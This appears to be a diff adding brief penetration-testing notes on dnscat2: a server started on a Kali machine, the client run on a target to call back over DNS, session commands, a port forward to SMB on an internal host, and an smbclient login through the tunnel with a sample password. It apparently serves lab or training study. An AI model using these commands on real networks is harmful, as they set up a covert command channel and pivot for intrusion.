@@ -1,0 +1,20 @@
+Kali:
+$ dnscat2-server feline.corp
+
+Target:
+$ ./dnscat feline.corp
+
+=====================
+  
+Kali DNSCat2 Usage:
+# print sessions:
+dnscat2> windows
+
+# Interact with session 1:
+dnscat2> window -i 1
+
+# Create local tunnel from port 4455 to port 445 on Internal Network:
+dnscat2> listen 127.0.0.1:4455 172.16.2.11:445
+
+# Sample:
+$ smbclient -p 4455 -L //127.0.0.1 -U share_admin --password=Secret1234
